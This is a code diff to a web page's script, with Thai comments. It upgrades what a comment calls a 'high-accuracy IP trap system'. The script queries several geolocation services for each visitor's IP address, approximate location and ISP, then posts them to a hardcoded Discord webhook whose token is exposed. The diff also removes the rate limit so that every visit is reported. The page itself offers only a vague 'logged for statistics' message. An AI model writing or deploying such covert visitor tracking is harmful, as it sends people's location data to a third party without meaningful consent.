@@ -73,33 +73,53 @@
       if (!on && el) el.remove();
     }
 
-      // ---------- แจ้ง Discord ----------
+    // ---------- แจ้ง Discord (ระบบดัก IP ความแม่นยำสูง) ----------
     const WEBHOOK = "https://discord.com/api/webhooks/1566010672658120764/Ixquirn6vSXk9nQwam2tkyhQ7fvW3jm7sWkrJVKau3XtZ44CbeB7S8s933cC6ZoMTcOn";
 
     async function getInfo() {
-      try {
-        const r = await fetch("https://ipwho.is/");
-        const d = await r.json();
-        if (d.success) {
-          return {
-            ip: d.ip,
-            type: d.type || "",
-            loc: [d.city, d.region, d.country].filter(Boolean).join(", ") || "ไม่ทราบ",
-            isp: (d.connection && d.connection.isp) || "ไม่ทราบ"
-          };
+      const apis = [
+        "https://ipapi.co/json/",
+        "https://ipwho.is/",
+        "https://api.ipify.org?format=json"
+      ];
+
+      let info = { ip: "ไม่ทราบ", loc: "ไม่ทราบ", isp: "ไม่ทราบ", type: "" };
+
+      for (const api of apis) {
+        try {
+          const res = await fetch(api);
+          const data = await res.json();
+          if (api.includes("ipapi.co")) {
+            if (data.ip) {
+              info.ip = data.ip;
+              info.loc = [data.city, data.region, data.country_name].filter(Boolean).join(", ");
+              info.isp = data.org || "ไม่ทราบ";
+              info.type = data.version || "";
+              break;
+            }
+          } else if (api.includes("ipwho.is")) {
+            if (data.success) {
+              info.ip = data.ip;
+              info.loc = [data.city, data.region, data.country].filter(Boolean).join(", ");
+              info.isp = (data.connection && data.connection.isp) || "ไม่ทราบ";
+              info.type = data.type || "";
+              break;
+            }
+          } else if (api.includes("ipify.org")) {
+            if (data.ip) {
+              info.ip = data.ip;
+              break;
+            }
+          }
+        } catch (e) {
+          continue;
         }
-      } catch (e) {}
-      try {
-        const r = await fetch("https://api.ipify.org?format=json");
-        return { ip: (await r.json()).ip, type: "", loc: "ไม่ทราบ", isp: "ไม่ทราบ" };
-      } catch (e) { return null; }
+      }
+      return info;
     }
 
     async function notify(info) {
       try {
-        const last = Number(localStorage.getItem("lastPing") || 0);
-        if (Date.now() - last < 60000) return;
-        localStorage.setItem("lastPing", Date.now());
         await fetch(WEBHOOK, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -130,27 +150,11 @@
       await type("> [OK] connection established\n");
       const info = await infoPromise;
       await type("> visitor IP : " + (info ? info.ip : "unknown") + "\n");
-      if (info) await type("> approx. location : " + info.loc + "\n");
+      if (info && info.loc !== "ไม่ทราบ") await type("> approx. location : " + info.loc + "\n");
       await type("> access logged for statistics\n");
       await type("\n> welcome, visitor_ \n");
       cursor(true);
       if (info) notify(info);
-    })();
-
-    // ---------- เริ่มทำงาน ----------
-    (async () => {
-      const ipPromise = getIP();
-      await type("> initializing system...\n");
-      await sleep(300);
-      await type("> connecting to server...\n");
-      await sleep(300);
-      await type("> [OK] connection established\n");
-      const ip = await ipPromise;
-      await type("> visitor IP : " + (ip || "unknown") + "\n");
-      await type("> access logged for statistics\n");
-      await type("\n> welcome, visitor_ \n");
-      cursor(true);
-      if (ip) notify(ip);
     })();
   </script>
 </body>
